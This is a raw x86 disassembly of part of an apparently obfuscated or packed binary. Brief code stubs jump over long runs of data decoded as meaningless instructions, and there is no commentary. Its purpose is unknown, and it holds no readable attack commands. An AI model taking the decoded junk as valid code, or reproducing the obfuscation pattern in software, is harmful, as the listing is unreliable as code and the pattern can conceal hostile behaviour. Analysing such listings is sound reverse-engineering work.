  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	mov    DWORD PTR [edi+ebx*4+0x7e2547b7],ecx
  404a92:	jle    0x404a25
  404a94:	jl     0x404b14
  404a96:	jle    0x404b11
  404a98:	imul   ebp,esi,0x482e9e64
  404a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a9f:	aad    0x1a
  404aa1:	sub    dl,ah
  404aa3:	adc    eax,0x9a12cc9d
  404aa8:	hlt    
  404aa9:	(bad)  
  404aaa:	push   ds
  404aab:	(bad)  
  404aad:	test   DWORD PTR [ecx],esi
  404aaf:	adc    al,0x10
  404ab1:	mov    al,0xb7
  404ab3:	adc    dl,BYTE PTR [esi+esi*1-0x5f5650a2]
  404aba:	or     BYTE PTR ds:0x4881de86,al
  404ac0:	pop    esp
  404ac1:	rcl    DWORD PTR ds:[ecx],cl
  404ac4:	mov    eax,0xa58eeb4a
  404ac9:	and    ah,BYTE PTR [ebp+0x2b]
  404acc:	adc    DWORD PTR ds:0x4cec7baf,ebp
  404ad2:	mov    eax,0x290af8b2
  404ad7:	adc    ecx,esp
  404ad9:	sub    DWORD PTR [eax],esi
  404adb:	lea    ebx,ds:0xefeca685
  404ae1:	inc    edx
  404ae2:	retf   
  404ae3:	xchg   ecx,eax
  404ae4:	std    
  404ae5:	jmp    0x404b46
  404ae7:	xor    BYTE PTR [ebp-0x6b],ah
  404aea:	ror    bh,0x32
  404aed:	push   ebx
  404aef:	pop    ebp
  404af0:	aaa    
  404af1:	test   esi,edx
  404af3:	in     al,dx
  404af4:	nop
  404af5:	neg    DWORD PTR [ebx-0x5f1d7c57]
  404afb:	push   ss
  404afc:	dec    ecx
  404afd:	push   cs
  404afe:	inc    edx
  404aff:	push   ds
  404b00:	das    
  404b01:	loope  0x404ae4
  404b03:	jle    0x404b62
  404b05:	outs   dx,DWORD PTR ds:[esi]
  404b06:	and    al,0x40
  404b08:	add    eax,0xa5f8efd0
  404b0d:	jno    0x404ac4
  404b0f:	fadd   DWORD PTR gs:[edi-0x39df0548]
  404b16:	sub    ebx,0xffffffe2
  404b19:	(bad)  
  404b1a:	push   ebx
  404b1b:	jmp    0xbcab:0xe7c51dce
  404b22:	mov    eax,ds:0xa61597c7
  404b27:	ror    ebp,1
  404b29:	retf   
  404b2a:	xor    cl,BYTE PTR [ecx+esi*4-0xafef318]
  404b31:	and    BYTE PTR [ecx-0x624ae4aa],ah
  404b37:	sub    edi,DWORD PTR [ecx+0x5538d3f4]
  404b3d:	jmp    0x3077e2c1
  404b42:	and    eax,0x4165664
  404b47:	sahf   
  404b48:	fst    QWORD PTR [esi+0x1c]
  404b4b:	(bad)  
  404b4c:	addr16 mov bh,0x1a
  404b4f:	push   0xfffffffa
  404b51:	mov    cl,0x30
  404b53:	and    dh,bl
  404b55:	jge    0x404b5c
  404b57:	mov    ah,0x68
  404b59:	pop    ecx
  404b5a:	mov    ecx,0xd147ed62
  404b5f:	lea    ebp,[edx+0x284d1c33]
  404b65:	pop    es
  404b66:	fdiv   QWORD PTR ds:0x74be6d9d
  404b6c:	sbb    al,0x18
  404b6e:	lods   eax,DWORD PTR ds:[esi]
  404b6f:	add    eax,0x614712a6
  404b74:	add    eax,0x69e100d2
  404b79:	and    dh,BYTE PTR [eax-0x7a58cda1]
  404b7f:	mov    ebx,0xfea02956
  404b84:	mov    bh,0x4
  404b86:	fstp   TBYTE PTR ss:[edx+0x71472202]
  404b8d:	pop    edi
  404b8e:	sahf   
  404b8f:	xor    DWORD PTR [ecx],ebx
  404b91:	push   ds
  404b92:	shl    BYTE PTR [eax+0x6592c917],1
  404b98:	fistp  QWORD PTR [ebp+0x2a]
  404b9b:	inc    ebx
  404b9c:	sti    
  404b9d:	mov    dl,0xa7
  404b9f:	sahf   
  404ba0:	outs   dx,DWORD PTR ds:[esi]
  404ba1:	xor    edx,DWORD PTR [esi]
  404ba3:	dec    edx
  404ba4:	and    ch,cl
  404ba6:	push   ecx
  404ba7:	inc    ecx
  404ba8:	cdq    
  404ba9:	fldpi  
  404bab:	popa   
  404bac:	cdq    
  404bad:	outs   dx,DWORD PTR ds:[esi]
  404bae:	inc    BYTE PTR [edx]
  404bb0:	mov    eax,0xf9f62931
  404bb5:	cmp    ch,BYTE PTR [ecx+0x3135f735]
  404bbb:	or     al,0x1
  404bbd:	out    dx,al
  404bbe:	repnz jmp 0x8d49:0xbc62adcb
  404bc6:	je     0x404b9c
  404bc8:	(bad)  
  404bc9:	cli    
  404bca:	ret    
  404bcb:	or     BYTE PTR [esi-0x6f],0xad
  404bcf:	add    al,0xbe
  404bd1:	test   BYTE PTR [edx],dh
  404bd3:	(bad)  
  404bd4:	jmp    0x38d10826
  404bd9:	ficomp WORD PTR [ebx+0x293a0f84]
  404bdf:	sbb    dl,BYTE PTR [edx+ebx*1]
  404be2:	test   eax,0x9557be1
  404be7:	cmp    BYTE PTR [ebp-0x156f3228],ch
  404bed:	cmp    al,0x2a
  404bef:	adc    bl,BYTE PTR [ebx+0x5c]
  404bf2:	pop    ebx
  404bf3:	lock dec ebp
  404bf5:	and    esi,edi
  404bf7:	ins    DWORD PTR es:[edi],dx
  404bf8:	repz std 
  404bfa:	(bad)  
  404bfb:	aas    
  404bfc:	pop    eax
  404bfd:	push   ss
  404bfe:	fcmove st,st(3)
  404c00:	mov    dh,BYTE PTR [ebp+0xf]
  404c03:	(bad)  [eax+0x1f]
  404c06:	adc    BYTE PTR [ebx+0x7938cc07],ch
  404c0c:	or     ah,0xc7
  404c0f:	call   0x95c8:0xc371a304
  404c16:	add    DWORD PTR [ebx],esp
  404c18:	adc    DWORD PTR [edi-0x14],ecx
  404c1b:	push   es
  404c1c:	out    0x61,eax
  404c1e:	pop    ebx
  404c1f:	push   0xfffffff1
  404c21:	xchg   BYTE PTR [edi-0x28],dl
  404c24:	mov    WORD PTR [edx+0x55],es
  404c27:	scas   al,BYTE PTR es:[edi]
  404c28:	cld    
  404c29:	sbb    eax,0xadd6c777
  404c2e:	jno    0x404bd4
  404c30:	fstp   TBYTE PTR [edx-0x16]
  404c33:	or     BYTE PTR [edi-0x4e359e91],al
  404c39:	iret   
  404c3a:	lods   al,BYTE PTR ds:[esi]
  404c3b:	ss inc ecx
  404c3d:	hlt    
  404c3e:	mov    ebp,ebp
  404c40:	mov    edi,0x6b960932
  404c45:	adc    al,0x51
  404c47:	call   0xcf2b:0x32d35610
  404c4e:	pop    ds
  404c4f:	mov    dl,0xbb
  404c51:	pop    edi
  404c52:	and    dh,cl
  404c54:	int    0x5d
  404c56:	and    BYTE PTR [edi*4+0x561bc1cf],dl
  404c5d:	and    DWORD PTR [edx],ebp
  404c5f:	adc    eax,0x6d5acbd2
  404c64:	mov    esp,DWORD PTR [eax+0xd]
  404c67:	fisub  WORD PTR [esi+0x23]
  404c6a:	dec    edx
  404c6c:	(bad)  
  404c6d:	mov    esi,0xebbcbc9e
  404c72:	mov    ebp,0x4b2fdf5b
  404c77:	out    0x94,eax
  404c79:	xchg   esi,eax
  404c7a:	lds    ecx,FWORD PTR [ebp-0x1]
  404c7d:	mov    ebx,ecx
  404c7f:	pop    edi
  404c80:	pop    eax
  404c81:	out    0x1e,al
  404c83:	pop    esp
  404c84:	mov    WORD PTR [esi],cs
  404c86:	adc    BYTE PTR [edi+0x5de3f883],bh
  404c8c:	pop    edx
  404c8d:	xor    BYTE PTR [ecx+0x4f],0x80
  404c91:	and    eax,0x217fb2c8
  404c96:	les    ecx,FWORD PTR [esi-0x642a0f1]
  404c9c:	clc    
  404c9d:	shl    BYTE PTR [ebp+0x732d07fb],1
  404ca3:	neg    DWORD PTR [esi+0x44]
  404ca6:	inc    eax
  404ca7:	adc    eax,0x29cb8724
  404cac:	lea    esi,[edi]
  404cae:	popa   
  404caf:	push   0xd388ca1c
  404cb4:	cmp    BYTE PTR [esi+0x26],dl
  404cb7:	push   ebp
  404cb8:	lock es js 0x404c3f
  404cbc:	sub    DWORD PTR [edx+0x2c106625],esp
  404cc2:	push   esi
  404cc3:	mov    dl,0xf0
  404cc5:	cdq    
  404cc6:	jne    0x404c8a
  404cc8:	mov    cl,0x28
  404cca:	cdq    
  404ccb:	sbb    al,0xbd
  404ccd:	or     bl,BYTE PTR [ebp+0x2a]
  404cd0:	sbb    al,0xda
  404cd2:	xchg   BYTE PTR [eax-0x64],dh
  404cd5:	call   0x13809b69
  404cda:	cwde   
  404cdb:	mov    ?,WORD PTR cs:[ebx]
  404cde:	push   ebp
  404cdf:	loope  0x404d3e
  404ce1:	mov    bh,0x1a
  404ce3:	(bad)  
  404ce4:	rcl    BYTE PTR [esi],0xc
  404ce7:	mov    ds:0xa4734d78,eax
  404cec:	xchg   ebp,eax
  404ced:	mov    ebx,0x6e4301d0
  404cf2:	imul   eax,DWORD PTR [esi+edi*2+0x57],0xffffff9c
  404cf7:	pop    ecx
  404cf8:	or     DWORD PTR [eax+ecx*1],edx
  404cfb:	leave  
  404cfc:	pop    ss
  404cfd:	jecxz  0x404ccf
  404cff:	adc    eax,0x4de62d25
  404d04:	loope  0x404d49
  404d06:	mov    ch,0x7a
  404d08:	push   edx
  404d09:	pop    ss
  404d0a:	and    dl,ah
  404d0c:	and    ah,0xb4
  404d0f:	ja     0x404cc5
  404d11:	and    ecx,DWORD PTR [edx-0x2e93b309]
  404d17:	cmp    DWORD PTR [edi-0xc4ffa87],0xffffffb6
  404d1e:	push   ds
  404d1f:	call   0x644dee73
  404d24:	leave  
  404d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d26:	push   ds
  404d27:	or     edi,ebp
  404d29:	fiadd  DWORD PTR [edx+0x5c062277]
  404d2f:	ficom  DWORD PTR [edx]
  404d31:	popf   
  404d32:	mov    DWORD PTR [esi],esp
  404d34:	cmp    al,0xf7
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x59f5991f
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d3f
  404d6a:	add    DWORD PTR [eax],0xffffffab
  404d6d:	daa    
  404d6e:	xchg   ecx,eax
  404d6f:	std    
  404d70:	xor    edi,edx
  404d72:	pop    esi
  404d73:	adc    esp,edx
  404d75:	dec    eax
  404d76:	sbb    eax,0x5879d9c9
  404d7b:	es (bad) 
  404d7d:	pop    ebp
  404d7e:	xchg   ecx,eax
  404d7f:	jmp    0xa84d:0x3dabc0cf
  404d86:	push   ecx
  404d87:	or     BYTE PTR [ebx],bl
  404d89:	xor    ebx,DWORD PTR [edx]
  404d8b:	and    eax,0xbd7afdd7
  404d90:	aam    0xc3
  404d92:	push   esi
  404d93:	jecxz  0x404d6c
  404d95:	mov    WORD PTR [edx+0x7218315e],fs
  404d9b:	adc    cl,BYTE PTR ds:0xc680fe71
  404da1:	push   0x7b
  404da3:	and    ah,0x5d
  404da6:	adc    eax,0x187fa3e4
  404dab:	jb     0x404d74
  404dad:	and    edi,eax
  404daf:	mov    ecx,0x6b8e09c3
  404db4:	cwde   
  404db5:	inc    edi
  404db6:	std    
  404db7:	in     eax,dx
  404db8:	loop   0x404d55
  404dba:	jl     0x404e10
  404dbc:	inc    eax
  404dbd:	rol    DWORD PTR [edx-0x533ccc15],1
  404dc3:	fcmovne st,st(2)
  404dc5:	push   esi
  404dc6:	cmp    eax,0xf6a9996d
  404dcb:	xor    eax,0x1798e026
  404dd0:	int3   
  404dd1:	rcr    BYTE PTR [ecx-0x4d80ccaf],cl
  404dd7:	xchg   edx,eax
  404dd8:	mov    ah,0xf2
  404dda:	ja     0x404d67
  404ddc:	std    
  404ddd:	cmp    edx,DWORD PTR [ecx+0x33f571b8]
  404de3:	xor    al,0xac
  404de5:	rol    bh,cl
  404de7:	pop    ss
  404de8:	mov    cl,0xfa
  404dea:	bound  ebp,QWORD PTR [edi]
  404dec:	enter  0x6434,0xee
  404df0:	or     al,0x6c
  404df2:	push   ss
  404df3:	shl    ch,1
  404df5:	out    dx,al
  404df6:	mov    bh,0x29
  404df8:	inc    edi
  404df9:	cmp    BYTE PTR [edx],bl
  404dfb:	inc    esi
  404dfc:	jmp    0xbd3a:0xcdd5e36c
  404e03:	outs   dx,DWORD PTR ds:[esi]
  404e04:	or     eax,0x9a111ee7
  404e09:	repz sbb al,0xb7
  404e0c:	clc    
  404e0d:	cwde   
  404e0e:	add    eax,0xade638f8
  404e13:	addr16 mov ds:0xb3ac,al
  404e17:	iret   
  404e18:	mov    ?,WORD PTR [ebp+0x72033615]
  404e1e:	call   DWORD PTR [esp+eax*2+0x17]
  404e22:	fisub  DWORD PTR [ebx+0x5cabebfb]
  404e28:	and    eax,DWORD PTR ds:[edi]
  404e2b:	mov    edi,edx
  404e2d:	or     ah,BYTE PTR [ebx+esi*1+0x6f52ef24]
  404e34:	stc    
  404e35:	dec    esp
  404e36:	outs   dx,DWORD PTR ds:[esi]
  404e37:	mov    esi,0x647db0cc
  404e3c:	or     eax,0x62c94a23
  404e41:	xchg   ecx,eax
  404e42:	out    0xd3,al
  404e44:	pop    ebp
  404e45:	imul   ecx,DWORD PTR [ebp+0x40],0xce9d0636
  404e4c:	mov    dh,BYTE PTR [ecx]
  404e4e:	mov    dh,0x11
  404e50:	push   esp
  404e51:	or     BYTE PTR [ebx-0x7c],al
  404e54:	ins    DWORD PTR es:[edi],dx
  404e55:	inc    esi
  404e56:	push   eax
  404e57:	jp     0x404e37
  404e59:	adc    dl,BYTE PTR [esi+0x7d5f5290]
  404e5f:	dec    ebx
  404e60:	loop   0x404e9f
  404e62:	cld    
  404e63:	out    0x86,al
  404e65:	jae    0x404e29
  404e67:	or     al,0xda
  404e69:	mov    ds:0x251e38e9,al
  404e6e:	jg     0x404e4a
  404e70:	and    eax,0x950abfc3
  404e75:	mov    bh,0x69
  404e77:	and    BYTE PTR [ebx+edx*2-0x67],ch
  404e7b:	mov    bh,0x67
  404e7d:	sbb    al,0xef
  404e7f:	mov    ebp,0xfd7fc2af
  404e84:	test   al,0x86
  404e86:	fstp   TBYTE PTR [edi]
  404e88:	xor    al,BYTE PTR [ecx]
  404e8a:	or     ah,cl
  404e8c:	sbb    eax,0x350e56a7
  404e91:	scas   eax,DWORD PTR es:[edi]
  404e92:	ror    DWORD PTR [eax-0x32],1
  404e95:	pop    ecx
  404e96:	cmp    edi,ebp
  404e98:	in     eax,dx
  404e99:	scas   al,BYTE PTR es:[edi]
  404e9a:	mov    al,0x20
  404e9c:	push   0xac3922df
  404ea1:	adc    eax,0x95bbb8b3
  404ea6:	cmp    eax,0x63d4ec61
  404eab:	adc    bh,0xd9
  404eae:	lahf   
  404eaf:	mov    ch,0x20
  404eb1:	adc    eax,0x37ac881e
  404eb6:	push   edi
  404eb7:	inc    ebx
  404eb8:	retf   0x750f
  404ebb:	arpl   WORD PTR [edx-0x61],bx
  404ebe:	sub    BYTE PTR [eax+0x64],ch
  404ec1:	cmp    eax,0x4fc0663f
  404ec6:	call   0xd21bd0f4
  404ecb:	xchg   BYTE PTR [edx+0x28],bh
  404ece:	jmp    0xdf20:0x7c48b23c
  404ed5:	test   BYTE PTR [ecx],bh
  404ed7:	lds    edi,FWORD PTR [esi]
  404ed9:	scas   al,BYTE PTR es:[edi]
  404eda:	add    dh,bh
  404edc:	(bad)  
  404ede:	ins    DWORD PTR es:[edi],dx
  404edf:	fwait
  404ee0:	push   edx
  404ee1:	pop    eax
  404ee2:	pop    eax
  404ee3:	inc    ebx
  404ee4:	pop    esp
  404ee5:	mov    dl,0x50
  404ee7:	lods   al,BYTE PTR ds:[esi]
  404ee8:	aam    0x53
  404eea:	repnz mov ds:0xc24d1554,al
  404ef0:	lea    esp,[ebp-0x7b5cb11d]
  404ef6:	sbb    al,0x37
  404ef8:	push   esi
  404ef9:	jmp    0xb1c2:0x2dfb7f04
  404f00:	sbb    DWORD PTR [ebp+0x1dab647f],ebx
  404f06:	stos   BYTE PTR es:[edi],al
  404f07:	xor    DWORD PTR [edi+0xc5d0d92],edi
  404f0d:	fist   WORD PTR [esi+0x3cc9537f]
  404f13:	jns    0x404f42
  404f15:	je     0x404f93
  404f17:	inc    ebp
  404f18:	jmp    0xb4704081
  404f1d:	xor    ecx,0x25acd9d3
  404f23:	xchg   DWORD PTR [edx+0x18b624ae],ecx
  404f29:	popf   
  404f2a:	push   0xed23d5da
  404f2f:	dec    edi
  404f30:	sub    BYTE PTR [esi-0x1edd70b],dl
  404f36:	mov    eax,0xd668d91a
  404f3b:	dec    esp
  404f3c:	stos   BYTE PTR es:[edi],al
  404f3d:	cmp    BYTE PTR [ecx-0x172d0b56],bl
  404f43:	clc    
  404f44:	xchg   esi,eax
  404f45:	mov    al,ds:0x7c92c35
  404f4a:	icebp  
  404f4b:	push   eax
  404f4c:	rcr    BYTE PTR [ebp-0x40],1
  404f4f:	jb     0x404fc0
  404f51:	jg     0x404f07
  404f53:	mov    esp,0x63d742b5
  404f58:	jge    0x404fab
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	or     al,al
  405054:	sbb    eax,0x7e2ed66e
  405059:	jle    0x4050c9
  40505b:	jg     0x4050db
  40505d:	jle    0x405019
  40505f:	xchg   DWORD PTR [eax-0x7c],ebp
  405062:	das    
  405063:	icebp  
  405064:	pop    esi
  405065:	and    eax,DWORD PTR [edx]
  405067:	sbb    bh,BYTE PTR [ecx-0xd797d57]
  40506d:	pop    es
  40506e:	in     al,0x79
  405070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405071:	sub    DWORD PTR [ebx-0x14e4acfb],0xffffffc9
  405078:	inc    ebx
  405079:	cmp    al,0xd5
  40507b:	pop    ss
  40507c:	cs mov ch,0x6a
  40507f:	hlt    
  405080:	icebp  
  405081:	mov    eax,ds:0xe682a6b
  405086:	sahf   
  405087:	jo     0x405052
  405089:	icebp  
  40508a:	pop    ebp
  40508b:	pushf  
  40508c:	push   edx
  40508d:	add    BYTE PTR [edi-0x69536013],bl
  405093:	mov    bl,0x66
  405095:	pop    edi
  405096:	sbb    al,0x21
  405098:	jne    0x40503e
  40509a:	fisttp DWORD PTR [ebx]
  40509c:	jnp    0x40505e
  40509e:	inc    eax
  40509f:	sub    edx,DWORD PTR [ecx-0x307c6548]
  4050a5:	push   edi
  4050a6:	outs   dx,BYTE PTR ds:[esi]
  4050a7:	les    ebx,FWORD PTR [eax+esi*8]
  4050aa:	pusha  
  4050ab:	add    dh,BYTE PTR [ebp-0x602fbadf]
  4050b1:	sbb    DWORD PTR [ecx-0x76],0xffffffb4
  4050b5:	sar    BYTE PTR [esi],cl
  4050b7:	iret   
  4050b8:	cmp    BYTE PTR [edi-0x7bf04e17],bl
  4050be:	or     cl,BYTE PTR gs:[eax-0x3ce58497]
  4050c5:	xchg   edi,eax
  4050c6:	xchg   ebp,eax
  4050c7:	inc    ebx
  4050c8:	jnp    0x405147
  4050ca:	push   edx
  4050cb:	sti    
  4050cc:	push   ds
  4050cd:	mov    ebp,0x41029fb7
  4050d2:	sub    eax,0x4e4d7ffa
  4050d7:	xchg   ecx,eax
  4050d8:	cmp    ch,BYTE PTR [esi-0x61e6e70e]
  4050de:	jo     0x40506a
  4050e0:	sar    DWORD PTR [eax+0x262d372b],1
  4050e6:	sbb    eax,0xe0066f8a
  4050eb:	push   0xffffffeb
  4050ed:	ficomp WORD PTR [edi]
  4050ef:	xchg   edi,eax
  4050f0:	pushf  
  4050f1:	xor    eax,0xcadbc1fd
  4050f6:	push   es
  4050f7:	jb     0x40512b
  4050f9:	pusha  
  4050fa:	es jmp 0xe30ac2f0
  405100:	(bad)  
  405101:	fistp  DWORD PTR [esp+eiz*2]
  405104:	call   0xe9141630
  405109:	stc    
  40510a:	xchg   ecx,eax
  40510b:	fild   WORD PTR [eax+esi*8+0x7a]
  40510f:	(bad)  
  405110:	and    ebx,DWORD PTR [edx-0x60]
  405113:	je     0x4050c4
  405115:	ss xor ebx,eax
  405118:	adc    DWORD PTR [esi-0x31],0x32
  40511c:	sub    BYTE PTR [eax],al
  40511e:	call   0xdb6d:0x9c97a76a
  405125:	adc    esi,eax
  405127:	push   ds
  405128:	sub    al,0xb5
  40512a:	cmp    cl,BYTE PTR [ebp+0x1c]
  40512d:	mov    ebx,0x6940755c
  405132:	es test al,0x0
  405135:	adc    DWORD PTR [eax+ebx*4+0x4f],esi
  405139:	out    0xda,al
  40513b:	or     bp,ax
  40513e:	lahf   
  40513f:	in     eax,dx
  405140:	or     DWORD PTR [ebx],ecx
  405142:	(bad)  
  405143:	or     bh,BYTE PTR [esi-0x5000c6a7]
  405149:	inc    eax
  40514a:	sbb    al,0x6c
  40514c:	inc    ebx
  40514d:	ret    0x7b6e
  405150:	or     dh,BYTE PTR [eax+0x107a7e60]
  405156:	mov    cl,0x62
  405158:	into   
  405159:	add    al,0x4e
  40515b:	mov    al,ds:0x4ba19247
  405160:	adc    edx,ebp
  405162:	mov    cl,0x98
  405164:	int3   
  405165:	jns    0x40515b
  405167:	rol    DWORD PTR [edi],cl
  405169:	fisubr DWORD PTR [ebx+ebp*1]
  40516c:	fisub  DWORD PTR [eax]
  40516e:	aam    0x88
  405170:	jmp    0x60d0:0xf2ef9230
  405177:	xchg   ebp,eax
  405178:	hlt    
  405179:	cmp    cl,al
  40517b:	sbb    al,0x2a
  40517d:	call   0xba950417
  405182:	js     0x4051eb
  405184:	out    dx,eax
  405185:	dec    ecx
  405186:	gs dec esi
  405188:	ins    DWORD PTR es:[edi],dx
  405189:	aad    0xce
  40518b:	jae    0x405147
  40518d:	leave  
  40518e:	push   0xffffffd0
  405190:	outs   dx,DWORD PTR ds:[esi]
  405191:	jnp    0x405161
  405193:	cld    
  405194:	jbe    0x4051f0
  405196:	lahf   
  405197:	adc    BYTE PTR [esi-0x5],bl
  40519a:	sub    ecx,DWORD PTR [ecx]
  40519c:	mov    ebp,0x17f9010b
  4051a1:	in     al,0x5b
  4051a3:	test   DWORD PTR [edx],edi
  4051a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a6:	in     eax,0x61
  4051a8:	add    al,0x4e
  4051aa:	cmp    esi,ebx
  4051ac:	repnz push eax
  4051ae:	fadd   QWORD PTR gs:[ecx-0x30dd1a6c]
  4051b5:	mov    al,BYTE PTR [edi-0x43]
  4051b8:	outs   dx,DWORD PTR ds:[esi]
  4051b9:	enter  0x4c9f,0x26
  4051bd:	add    eax,DWORD PTR [eax-0x31c653a6]
  4051c3:	pop    ss
  4051c4:	in     al,0xcb
  4051c6:	push   ecx
  4051c7:	fcomp  DWORD PTR [ecx-0x2e]
  4051ca:	cli    
  4051cb:	outs   dx,BYTE PTR ds:[esi]
  4051cc:	xor    ecx,DWORD PTR [ebx-0x2a026573]
  4051d2:	cmp    ecx,edx
  4051d4:	lods   eax,DWORD PTR ds:[esi]
  4051d5:	jecxz  0x405171
  4051d7:	pop    ds
  4051d8:	call   0x11b9:0xfb51e03c
  4051df:	ficomp DWORD PTR [ecx-0x19a1ce27]
  4051e5:	mov    bh,0x9b
  4051e7:	xchg   ecx,eax
  4051e8:	and    eax,DWORD PTR [esi+0x16]
  4051eb:	or     DWORD PTR [edi+0x47],0x69ff7394
  4051f2:	mov    cl,0x56
  4051f4:	in     ax,dx
  4051f6:	stos   BYTE PTR es:[edi],al
  4051f7:	mov    gs,WORD PTR [edx+0xdc6891e]
  4051fd:	nop
  4051fe:	pop    ebp
  4051ff:	leave  
  405200:	test   al,0xf1
  405202:	in     al,0x5
  405204:	xor    al,bl
  405206:	cmp    DWORD PTR [edi+edx*1+0x772e689f],edi
  40520d:	mov    bl,0xd7
  40520f:	or     DWORD PTR [esp+ebp*4],0xffffff9e
  405213:	sar    DWORD PTR [edi-0x5f8a20a9],cl
  405219:	loop   0x4051af
  40521b:	lods   eax,DWORD PTR ds:[esi]
  40521c:	shr    BYTE PTR [ecx],cl
  40521e:	retf   0x58d
  405221:	mov    dl,0xe5
  405223:	fisubr WORD PTR [esi]
  405225:	fsub   st,st(7)
  405227:	sti    
  405228:	inc    esp
  405229:	push   edi
  40522a:	in     eax,0x6d
  40522c:	adc    ecx,DWORD PTR [ebx+0x4d]
  40522f:	test   BYTE PTR ds:[ebp+0x42e67f9c],cl
  405236:	jle    0x4052a7
  405238:	sbb    DWORD PTR [ecx-0x6c],edi
  40523b:	stos   DWORD PTR es:[edi],eax
  40523c:	push   esp
  40523d:	jmp    0xd5bc0201
  405242:	sub    DWORD PTR [ebx],esp
  405244:	lock and BYTE PTR [esi],al
  405247:	pop    esp
  405248:	pop    esi
  405249:	pop    es
  40524a:	(bad)  [eax-0x5a]
  40524d:	push   edi
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	(bad)  
  40527d:	std    
  40527e:	push   ds
  40527f:	pop    ebx
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052ff
  405289:	fisttp DWORD PTR [ebp+0x7e]
  40528c:	or     esi,esp
  40528e:	inc    esi
  40528f:	bound  edx,QWORD PTR [ebp+0x62]
  405292:	jp     0x405231
  405294:	(bad)  
  405295:	cdq    
  405296:	cwde   
  405297:	mov    dl,0x16
  405299:	aas    
  40529a:	cli    
  40529b:	sahf   
  40529c:	dec    esi
  40529d:	daa    
  40529e:	cmp    eax,0x6b417310
  4052a3:	and    ebp,DWORD PTR [edx]
  4052a5:	fbstp  TBYTE PTR [edx]
